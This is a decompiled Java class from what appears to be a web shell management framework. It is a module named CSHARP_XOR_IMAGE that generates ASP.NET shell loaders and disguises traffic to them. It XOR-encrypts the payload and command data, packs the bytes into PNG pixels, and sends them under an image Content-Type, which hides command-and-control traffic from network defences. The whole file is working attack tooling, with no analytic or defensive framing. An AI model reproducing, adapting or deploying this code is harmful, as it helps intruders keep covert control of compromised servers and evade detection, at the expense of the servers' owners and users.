//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import core.annotation.CryptionAnnotation;
import core.annotation.PropertyAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Random;
import javax.imageio.ImageIO;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;

@CryptionAnnotation(
        Name = "CSHARP_XOR_IMAGE",
        payloadName = "CSharpDynamicPayload"
)
public class CSharpXorImage implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private String key;
    private boolean state;
    private byte[] payload;
    @PropertyAnnotation(
            Name = "suffix",
            Value = "aspx;ashx;"
    )
    private String suffix;
    String[] imageFormats = new String[]{"png"};
    String selectedFormat;

    public CSharpXorImage() {
    }

    public void init(ShellEntity context) {
        this.selectedFormat = this.imageFormats[(new Random()).nextInt(this.imageFormats.length)];
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX();

        try {
            this.shell.putHeader("Content-Type", "image/" + this.selectedFormat);
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception var3) {
            Log.error(var3);
        }

    }

    public synchronized byte[] encode(byte[] data) {
        try {
            return this.encrypt(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            return this.decrypt(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    private byte[] encrypt(byte[] bytes) throws IOException {
        byte[] keyBytes = this.key.getBytes();
        byte[] suffix = new byte[]{-1, -120, 0};
        byte[] encodedBytes = new byte[bytes.length + suffix.length];
        System.arraycopy(bytes, 0, encodedBytes, 0, bytes.length);
        System.arraycopy(suffix, 0, encodedBytes, bytes.length, suffix.length);
        int remaining = encodedBytes.length % 3;
        if (remaining != 0) {
            byte[] padding = new byte[3 - remaining];
            (new Random()).nextBytes(padding);
            encodedBytes = Arrays.copyOf(encodedBytes, encodedBytes.length + padding.length);
            System.arraycopy(padding, 0, encodedBytes, encodedBytes.length - padding.length, padding.length);
        }

        int width;
        for(width = 0; width < encodedBytes.length; ++width) {
            encodedBytes[width] ^= keyBytes[width % keyBytes.length];
        }

        width = (int)Math.ceil(Math.sqrt((double)(encodedBytes.length / 3)));
        int height = (int)Math.ceil((double)encodedBytes.length / (double)(width * 3));
        BufferedImage image = new BufferedImage(width, height, 1);
        int index = 0;

        for(int y = 0; y < height; ++y) {
            for(int x = 0; x < width && index < encodedBytes.length; ++x) {
                int r = encodedBytes[index++] & 255;
                int g = index < encodedBytes.length ? encodedBytes[index++] & 255 : 0;
                int b = index < encodedBytes.length ? encodedBytes[index++] & 255 : 0;
                int rgb = r << 16 | g << 8 | b;
                image.setRGB(x, y, rgb);
            }
        }

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ImageIO.write(image, this.selectedFormat, outputStream);
        return outputStream.toByteArray();
    }

    private byte[] decrypt(byte[] pngBytes) throws IOException {
        byte[] keyBytes = this.key.getBytes();
        BufferedImage image = ImageIO.read(new ByteArrayInputStream(pngBytes));
        int width = image.getWidth();
        int height = image.getHeight();
        byte[] encodedBytes = new byte[width * height * 3];
        int index = 0;

        int suffixIndex;
        for(suffixIndex = 0; suffixIndex < height; ++suffixIndex) {
            for(int x = 0; x < width; ++x) {
                int rgb = image.getRGB(x, suffixIndex);
                encodedBytes[index++] = (byte)(rgb >> 16 & 255);
                encodedBytes[index++] = (byte)(rgb >> 8 & 255);
                encodedBytes[index++] = (byte)(rgb & 255);
            }
        }

        for(suffixIndex = 0; suffixIndex < encodedBytes.length; ++suffixIndex) {
            encodedBytes[suffixIndex] ^= keyBytes[suffixIndex % keyBytes.length];
        }

        for(suffixIndex = encodedBytes.length - 1; suffixIndex >= 2 && (encodedBytes[suffixIndex] != 0 || encodedBytes[suffixIndex - 1] != -120 || encodedBytes[suffixIndex - 2] != -1); --suffixIndex) {
        }

        if (suffixIndex < 2) {
            throw new IllegalArgumentException("Invalid encoded bytes");
        } else {
            return Arrays.copyOf(encodedBytes, suffixIndex - 2);
        }
    }

    public boolean isSendRLData() {
        return false;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder("xorimage.bin", this.suffix, password, secretKey);
    }
}
